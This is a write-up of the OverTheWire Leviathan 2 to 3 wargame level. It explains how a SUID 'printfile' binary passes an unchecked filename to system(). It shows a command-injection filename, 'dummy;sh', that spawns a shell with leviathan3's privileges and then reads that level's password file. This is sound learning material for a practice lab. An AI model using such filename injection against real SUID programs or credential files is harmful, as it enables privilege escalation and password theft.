# Leviathan 2 → Leviathan 3

## 1. Initial Enumeration

First, I logged into the server:

```bash
ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
```

I started by looking around the home directory.

```bash
ls -la
```

There was an interesting executable called `printfile`.

```bash
ls -l ./printfile
```

Output:

```text
-r-sr-x--- 1 leviathan3 leviathan2 15068 Oct 25 13:39 ./printfile
```

The important thing here is the `s` in the permission string.

This means the binary has the SUID bit set and is owned by `leviathan3`.

So when `leviathan2` executes this binary, it can run with the effective privileges of `leviathan3`.

## 2. Understanding the Binary

I downloaded the binary to my local WSL environment so I could inspect it with Ghidra and GDB.

One thing I learned is that downloading the binary does not preserve its original SUID ownership and privileges. My local copy runs with my normal user permissions.

I used Ghidra to decompile the `main()` function.

The interesting part was:

```c
iVar3 = access((char *)param_2[1], 4);

if (iVar3 == 0) {
    snprintf(local_214, 0x1ff, "/bin/cat %s", puVar1[1]);

    __euid = geteuid();
    __ruid = geteuid();

    setreuid(__ruid, __euid);

    system(local_214);
}
```

At first, I was mostly interested in `access()` and `system()`.

I wanted to understand why the program checked the file permission first and then executed `cat`.

## 3. Understanding the Vulnerability

The problem is that the program uses the user input directly inside a shell command.

First:

```c
access(filename, 4);
```

This checks whether the supplied filename is readable.

Then:

```c
snprintf(local_214, 0x1ff, "/bin/cat %s", filename);
system(local_214);
```

The filename is inserted directly into a command and passed to `system()`.

I realized that these two functions interpret the input differently.

- `access()` treats the input as a literal filename.
- `system()` passes the command to a shell, which interprets special characters.

For example, `;` is a shell command separator.

This means I could potentially make the program execute another command after `cat`.

## 4. Understanding the UID Changes

I initially thought I needed to inject something to change my identity to `leviathan3`.

However, the program already does this:

```c
__euid = geteuid();
__ruid = geteuid();

setreuid(__ruid, __euid);
```

The important thing is that both variables receive the effective UID.

When the SUID executable starts:

```text
Real UID      = leviathan2
Effective UID = leviathan3
```

After `setreuid()`:

```text
Real UID      = leviathan3
Effective UID = leviathan3
```

Then `system()` executes the shell command with these credentials.

So I don't need to inject any UID-changing code myself.

## 5. Exploitation

I initially tried creating a file in my home directory, but received a permission error.

I moved to `/tmp`, where I could create my own files.

```bash
cd /tmp
touch 'dummy;sh'
```

Then I executed the SUID binary:

```bash
~/printfile '/tmp/dummy;sh'
```

The program constructed this command:

```bash
/bin/cat /tmp/dummy;sh
```

The shell interpreted it as two commands:

```bash
/bin/cat /tmp/dummy
sh
```

The first command failed because `/tmp/dummy` did not exist.

But the second command still executed.

I got a new shell prompt:

```text
$
```

This was the important moment: I had successfully triggered the command injection.

To check the identity of the new shell, I could run:

```bash
id
```

The expected identity is `leviathan3`.

Then I could read the next level's password:

```bash
cat /etc/leviathan_pass/leviathan3
```

## 6. What I Learned

This challenge taught me several important things:

1. **SUID:** An executable can run with the effective privileges of its owner.
2. **Real UID vs Effective UID:** They are not necessarily the same.
3. **Command Injection:** Passing unsanitized user input into `system()` can allow arbitrary shell commands.
4. **Shell Metacharacters:** `;` separates commands, allowing additional commands to execute.
5. **GDB:** I learned how to inspect function arguments using the stack on a 32-bit x86 binary.

I also learned that local debugging and remote exploitation are two different things.

My local GDB environment helped me understand the program, but it did not reproduce the remote SUID privileges.

## 7. Final Thoughts

The interesting part of this challenge wasn't really the `sh` command itself.

It was understanding how the same input could be interpreted differently by `access()` and the shell.

The program trusted the input as a filename, but later treated it as part of a shell command.

That difference created the vulnerability.
